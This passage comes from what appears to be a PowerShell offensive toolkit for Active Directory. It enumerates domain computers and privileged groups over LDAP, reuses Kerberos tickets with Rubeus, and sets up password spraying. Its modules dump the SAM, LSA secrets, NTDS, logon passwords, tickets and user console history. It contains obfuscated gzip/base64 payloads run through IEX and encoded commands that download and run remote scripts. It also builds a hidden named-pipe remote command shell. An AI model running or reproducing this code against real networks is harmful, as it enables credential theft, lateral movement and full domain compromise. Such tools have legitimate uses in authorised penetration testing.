            Start-sleep -Milliseconds 100

            klist purge | Out-Null
            Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket | Out-Null

            try {
                Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
                $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
                $PDC = $domainContext.PdcRoleOwner.Name
                Write-Verbose "Creating LDAP TGS for $PDC"
            } catch {
                Write-Verbose "Error creating ticket to $PDC"
            }
        }
    }
}


################################################################################################################
##################################### Ticket logic for authentication ##########################################
################################################################################################################
# Set the userDomain when impersonating a user in one domain for access to an alternate domain
# Can't remember where I was going with this...
if ($UserDomain -ne ""){}

if (!$CurrentUser -and $Module -ne "Amnesiac"){Write-verbose "Obtaining current user ticket" ; GetCurrentUserTicket}
if (!$CurrentUser){Write-verbose "Processing ticket" ; ProcessTicket}

################################################################################################################
########################################## Domain Target Acquisition ###########################################
################################################################################################################

function Establish-LDAPSession {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [string]$DomainController  # Optional parameter for domain controller
    )

    if ($DomainController -and -not $DomainController.Contains(".")) {
        $DomainController = "$DomainController.$Domain"
    }

    # Define LDAP parameters
    $ldapServer = if ($DomainController) { $DomainController } else { $Domain }
    $ldapPort = 389 # Use 636 for LDAPS (SSL)

    # Load necessary assembly
    Add-Type -AssemblyName "System.DirectoryServices.Protocols"

    try {
        # Create LDAP directory identifier
        $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)

        # Establish LDAP connection as current user
        $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)

        # Use Negotiate (Kerberos or NTLM) for authentication
        $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

        # Bind (establish connection)
        $ldapConnection.Bind()  # Bind as the current user
        Write-Verbose "LDAP Bind successful to $Domain"
    }
    catch {
        Write-Error "Failed to establish LDAP connection to '$ldapServer'. Error: $_"
        RestoreTicket
        continue
    }
}

if ($DomainController -ne "") {
    Establish-LDAPSession -Domain $Domain -DomainController $DomainController
} else {
    Establish-LDAPSession -Domain $Domain
}



function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.Add("dnshostname") > $null
    $searcher.PropertiesToLoad.Add("operatingSystem") > $null
    return $searcher
}

if ($Method -ne "Spray") {
    if (!$IPAddress) {
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

        if ($Targets -match "^\*.*|.*\*$") {
            Write-Verbose "Obtaining wildcard computers (Enabled) from LDAP query"
            $wildcardFilter = $Targets -replace "\*", "*"
            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(dnshostname=$wildcardFilter))"
            $computers = $searcher.FindAll() | Where-Object {
                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
            }
        } 
        
        elseif ($Targets -eq "Workstations") {
            if ($Global:TargetsWorkstations -ne $null) {
                $Computers = $Global:TargetsWorkstations | Select-Object *
            } else {
                Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                $computers = $searcher.FindAll() | Where-Object {
                    $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                }
            }

            $Global:TargetsWorkstations = $computers | Select-Object *
        
        } 
        
        elseif ($Targets -eq "Servers") {
            if ($Global:TargetsServers -ne $null) {
                $computers = $Global:TargetsServers | Select-Object *
            } else {
                Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                $computers = $searcher.FindAll() | Where-Object {
                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                }
            }

            $Global:TargetsServers = $computers | Select-Object *
        
        } 
        
        elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
            if ($Global:TargetsDomainControllers -ne $null) {
                $computers = $Global:TargetsDomainControllers | Select-Object *
            } else {
                Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
                $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                $computers = $searcher.FindAll()
            }

            $Global:TargetsDomainControllers = $computers | Select-Object *
        
        } 
        
        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
            if ($Global:TargetsAll -ne $null) {
                $computers = $Global:TargetsAll | Select-Object *
            } else {
                Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                $computers = $searcher.FindAll() | Where-Object {
                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                }
            }

            $computers = $Global:TargetsAll = $computers | Select-Object *
        
        } 
        
        elseif ($Targets -notmatch "\*") {
            if ($IsFile) {
                $fileContent = Get-Content -Path $Targets
                $computers = @()

                foreach ($line in $fileContent) {
                    # Split the line by comma and trim any spaces
                    $names = $line -split ',' | ForEach-Object { $_.Trim() }

                    foreach ($name in $names) {
                        if ([string]::IsNullOrWhiteSpace($name)) {
                            continue
                        }

                        if ($name -notlike "*.*") {
                            $name += ".$domain"
                        }

                        $searcher.Filter = "(dnshostname=$name)"
                        $result = $searcher.FindOne()

                        if ($result -ne $null) {
                            $computers += $result.GetDirectoryEntry()
                        } else {
                            Write-Warning "No LDAP entry found for $name"
                        }
                    }
                }
            } else {
                Write-Host "Targets : $Targets"
                if ($Targets -notlike "*.*") {
                    $Targets += ".$domain"
                }
                $searcher.Filter = "(dnshostname=$Targets)"
                $result = $searcher.FindOne()

                if ($result -ne $null) {
                    $computers = @($result.GetDirectoryEntry())
                } else {
                    Write-Host
                    Write-Warning "No LDAP entry found for the computer: $Targets"
                    $computers = @()
                    RestoreTicket
                    continue
                }
            }
        }
    }
    
    # Ensure we only have unique entries. Mostly to resolve duplicate entries from file
    $computers = $computers | Select-Object -Unique *
    
    $ComputerCount = ($Computers).Count
    Write-Verbose "Total number of objects queried: $ComputerCount"
}



Write-Output ""

################################################################################################################
############################ Grab interesting users for various parsing functions ##############################
################################################################################################################


function Get-GroupMembers {
    param ([string]$GroupName)
    
    $searcher = New-Searcher
    $searcher.PropertiesToLoad.AddRange(@("member"))
    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
    $group = $searcher.FindOne()
    $members = @()

    if ($group -ne $null -and $group.Properties["member"]) {
        foreach ($memberDN in $group.Properties["member"]) {
            $searcher.Filter = "(distinguishedName=$memberDN)"
            $searcher.PropertiesToLoad.Clear()
            $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
            $object = $searcher.FindOne()

            if ($object -and $object.Properties["objectClass"] -contains "user") {
                $samName = $object.Properties["samAccountName"]
                if ($samName -and $samName.Count -gt 0) {
                    $members += $samName[0].ToString()
                }
            }
        }
    }

    return $members
}

if ($Module -eq "LogonPasswords" -or $Module -eq "eKeys" -or ($Module -eq "KerbDump" -and !$NoParse)) {
    $FQDNDomainName = $domain.ToLower()

    if ($global:DomainAdmins -eq $null) {
        Write-Verbose "Getting members from the Domain Admins group"
        $global:DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
        $FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
    }

    if ($global:EnterpriseAdmins -eq $null) {
        Write-Verbose "Getting members from the Enterprise Admins group"
        $global:EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
        $FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
    }

    if ($global:ServerOperators -eq $null) {
        Write-Verbose "Getting members from the Server Operators group"
        $global:ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
        $FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
    }

    if ($global:AccountOperators -eq $null) {
        Write-Verbose "Getting members from the Account Operators group"
        $global:AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
        $FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
    }
}


if ($Method -eq "Spray") {
    
    Write-Verbose "Performing user LDAP queries for method (Spray)"
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
    $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
    $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
    $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
        $Targets = $EnabledDomainUsers
    }
    elseif ($Targets -in $EnabledDomainUsers) {
        $EnabledDomainUsers = $Targets
    }
    else {
        $groupMembers = Get-GroupMembers -GroupName $Targets
        if ($groupMembers.Count -gt 0) {
            $EnabledDomainUsers = $groupMembers
        }
        elseif ($groupMembers.Count -eq 0) {
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Group either does not exist or is empty"
            return
        }
        else {
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Unspecified Error"
            return
        }
    }
}


# Grab Computer Accounts for spraying
function Get-ComputerAccounts {
Write-Verbose "Obtaining Computer Accounts (For Spraying) from LDAP"
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    try {
        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
        return $ComputerSamAccounts
    } catch {
        Write-Error "Failed to fetch computer accounts. Error: $_"
        return $null
    }
}
# Not needed at the moment
#$ComputerSamAccounts = Get-ComputerAccounts


if (!$LocalAuth){
if ($Method -ne "RDP"){
if (!$Force){
foreach ($EnterpriseAdmin in $EnterpriseAdmins){
        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
        if ($splitResult.Count -gt 1) {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
        RestoreTicket
        return
        }
    }
}

if (!$Force) {
    foreach ($DomainAdmin in $DomainAdmins) {
        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
        if ($splitResult.Count -gt 1) {
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
            RestoreTicket
            return
            }
        }
    }
}

if (!$CurrentUser) {
    if ($Method -ne "GenRelayList") {
        if ($Method -ne "SessionHunter"){
         if ($Method -ne "Spray"){
        try {
            $searcher = New-Searcher
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
            $user = $searcher.FindOne()
            $domainUser = $user.Properties["samAccountName"]
        }
        Catch {
           
           if ($Ticket -ne $null){} 
            elseif (!$DomainUser) {
                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specified username is not a valid domain user"
                return
                
                        }
                    }
                }
            }
        }
    }
}

################################################################################################################
################################## Information based on selected module ########################################
################################################################################################################

if ($Method -eq "SessionHunter"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Searching for systems where privileged users' credentials might be in running memory"
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Filtering by those for which we have admin rights"
    Write-Host
    Start-Sleep -Seconds 3
}

$moduleMessages = @{
    "KerbDump"         = "Tickets will be written to $KerbDump"
    "Tickets"          = "Tickets will be written to $MimiTickets"
    "LSA"              = "LSA output will be written to $LSA"
    "ekeys"            = "eKeys output will be written to $ekeys"
    "SAM"              = "SAM output will be written to $SAM"
    "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
    "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
    "Files"            = "File output will be written to $UserFiles"
    "NTDS"             = "NTDS output will be written to $NTDS"
}

if ($moduleMessages.ContainsKey($Module)) {
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host $moduleMessages[$Module]
    
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to display results in the console"
        ""
    }
}
elseif ($Method -eq "GenRelayList"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SMB Signing output will be written to $SMB"
}


################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

$ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@



$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@



# Compressed to help keep under the character limit for console execution

$LocalSAM = @'
Write-Output "" ; function DumpSAM{$gz="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";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

$Mongoose = @'
Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@


################################################################################################################
######################################## Command and Module logic ## ###########################################
################################################################################################################

# Tickets
if ($Module -eq "Tickets"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}


# Amnesiac
if ($Module -eq "Amnesiac"){

Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "Amnesiac PID: $Global:AmnesiacPID"

Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "PipeName: $Global:PN"

if ($Scramble){

Write-Host ""
Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "The switch Scramble is in use. Ensure Amnesiac is already running"

Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "In Amnesiac do ""GLset $Global:PN"" then hit option ""3"""
    
}

$SID = $Global:SID
$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

# Change the command string if the Method is WinRM
if ($Method -eq "WinRM"){$finalString = "powershell.exe -EncodedCommand ""$b64ServerScript"""}

else {
$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
$finalstring = $finalstring -replace '"', "'"
}

$Command = $finalstring
Start-sleep -seconds 2
}

# Tickets - KerbDump
if ($Module -eq "KerbDump"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

